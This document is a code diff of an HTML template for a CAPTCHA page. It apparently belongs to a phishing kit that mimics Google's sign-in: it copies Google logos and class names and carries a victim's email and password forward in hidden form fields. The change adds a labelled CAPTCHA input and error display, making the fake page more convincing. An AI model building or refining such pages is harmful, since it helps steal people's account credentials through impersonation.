@@ -284,14 +284,15 @@
                         <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="CAPTCHA" width="200" height="80">
                     </div>
                     <form method="POST" action="/captcha-callback">
-                        <input class="captcha-input" type="text" name="captcha_response" autocomplete="off" placeholder="Type the text you see" required style="margin-top:0;">
                         <input type="hidden" name="email" value="{{ email }}">
                         <input type="hidden" name="password" value="{{ password }}">
-                        <button class="captcha-btn" type="submit">Next</button>
+                        <label for="captcha_response">Enter CAPTCHA:</label>
+                        <input type="text" id="captcha_response" name="captcha_response" class="input-field" required style="border-color: {% if error %}#d93025{% else %}#8ab4f8{% endif %};">
+                        {% if error %}
+                        <div class="dMNVAe" style="color:#d93025; font-size:13px; margin-top:8px;">{{ error }}</div>
+                        {% endif %}
+                        <button type="submit" class="btn-next" id="captchaSubmitButton">Submit</button>
                     </form>
-                    <div class="captcha-help" style="margin-top: 10px;">
-                        Can't read the text? <a href="#" class="link-blue">Try another</a>
-                    </div>
                 </div>
 
                 <p class="guest-mode-text">
